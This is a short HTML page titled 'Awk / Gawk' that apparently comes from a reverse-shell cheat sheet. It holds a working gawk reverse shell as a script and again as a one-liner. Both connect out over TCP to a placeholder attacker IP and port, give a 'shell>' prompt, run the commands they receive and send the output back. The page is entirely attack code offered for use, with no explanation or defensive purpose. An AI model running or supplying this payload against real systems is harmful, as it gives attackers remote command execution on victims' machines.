<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Awk / Gawk</title>
</head><body>#!/usr/bin/awk -f<br/>
BEGIN {<br/>
s = "/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;"<br/>
while(42) {<br/>
do{<br/>
printf "shell&gt;" |&amp; s<br/>
s |&amp; getline c<br/>
if(c){<br/>
while ((c |&amp; getline) &gt; 0)<br/>
print $0 |&amp; s<br/>
close(c)<br/>
}<br/>
} while(c != "exit")<br/>
close(s)<br/>
}<br/>
}<br/>
<br/>
<br/>
awk 'BEGIN {s = "/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}' /dev/null</body></html>